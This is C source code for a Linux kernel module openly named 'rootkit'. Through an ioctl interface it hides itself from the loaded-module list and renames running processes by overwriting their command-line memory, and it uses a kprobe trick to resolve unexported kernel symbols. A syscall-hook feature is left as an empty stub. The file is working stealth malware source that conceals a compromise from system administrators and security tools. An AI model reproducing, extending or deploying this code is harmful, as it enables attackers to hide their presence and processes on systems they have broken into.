#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/kprobes.h>
#include <asm/syscall.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;
struct list_head *module_list;

int (*access_remote_vm_)(struct mm_struct *, unsigned long,
		void *, int, unsigned int);

static int rootkit_open(struct inode *inode, struct file *filp)
{

	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
	printk (KERN_INFO "%s\n", __func__);
	return 0;
}

// Check get_mm_cmdline
static int access_mm_name(struct mm_struct* mm, char* name, int len, unsigned int gup_flags) {
    unsigned long arg_start, arg_end;

	if (!mm->env_end)
		return 0;

	spin_lock(&mm->arg_lock);
	arg_start = mm->arg_start;
	arg_end = mm->arg_end;
	spin_unlock(&mm->arg_lock);

	if (arg_start >= arg_end)
		return 0;

    return access_remote_vm_(mm, arg_start, name, len, gup_flags);
}

static void rename_process(long len, struct masq_proc *masq) {
    long i;
    struct task_struct *p;
    struct mm_struct *mm;
    char task_name[MASQ_LEN];
    char buf[MASQ_LEN];

    for_each_process(p) {
        mm = p->mm;
        if (!mm)
            continue;
        access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
        task_name[MASQ_LEN - 1] = 0;
        // printk (KERN_INFO "| %s\n", task_name);

        for (i = 0; i < len; ++i) {
            if (!masq[i].orig_name[0])
                continue;
            if (!strcmp(task_name, masq[i].orig_name)) {
                memset(buf, 0, MASQ_LEN); 
                strcpy(buf, masq[i].new_name);
                access_mm_name(mm, buf, strlen(masq[i].orig_name), FOLL_WRITE);
                // printk (KERN_INFO "%s >> %s\n", masq[i].orig_name, masq[i].new_name);
                break;
            }
        }
        // mmput(mm);
    }
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
    long ret = 0;
    long i;
    struct masq_proc_req masq_req;
    struct masq_proc *masq;
    switch(ioctl) {
        case IOCTL_MOD_HOOK:
            //do something
            break;
        case IOCTL_MOD_HIDE:
            if (module_list == NULL) {
                // TODO SHOULD GO TO HEAD?
                module_list = THIS_MODULE->list.prev;
                list_del(&(THIS_MODULE->list));
            }
            else {
                list_add(&(THIS_MODULE->list), module_list);
                module_list = NULL;
            }
            break;
        case IOCTL_MOD_MASQ:
            masq_req.list = NULL;
            if (copy_from_user(&masq_req, (struct masq_proc_req __user*) arg,
                               sizeof(struct masq_proc_req))) {
                printk (KERN_INFO "First copy_from_user fail.\n");
                ret = -EINVAL;
                break;
            }
            // printk (KERN_INFO "%ld %px\n", masq_req.len, masq_req.list);
            masq = (struct masq_proc*)kmalloc(sizeof(struct masq_proc) * masq_req.len, GFP_KERNEL);
            if (masq == NULL) {
                printk (KERN_INFO "kmalloc fail.\n");
                ret = -EINVAL;
                break;
            }
            if (copy_from_user(masq, (struct masq_proc __user*) masq_req.list,
                               sizeof(struct masq_proc) * masq_req.len)) {
                printk (KERN_INFO "Second copy_from_user fail.\n");
                ret = -EINVAL;
                break;
            }
            for (i = 0; i < masq_req.len; ++i)
                if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
                    masq[i].orig_name[0] = 0;
            rename_process(masq_req.len, masq);
            kfree(masq);
            break;
        default:
            ret = -EINVAL;
    }

	printk (KERN_INFO "%s\n", __func__);
	return ret;
}

struct file_operations fops = {
	open:		rootkit_open,
	unlocked_ioctl:	rootkit_ioctl,
	release:	rootkit_release,
	owner:		THIS_MODULE
};

static void ksym_lookup(void) {
    // Lookup necessary functions
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"};
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
}

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no , 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major,0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add( kernel_cdev,dev,1);
	if(ret < 0 )
	{
		pr_info(KERN_INFO "unable to allocate cdev");
		return ret;
	}

    ksym_lookup();

	return 0;
}

static void __exit rootkit_exit(void)
{
	// TODO: unhook syscall

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
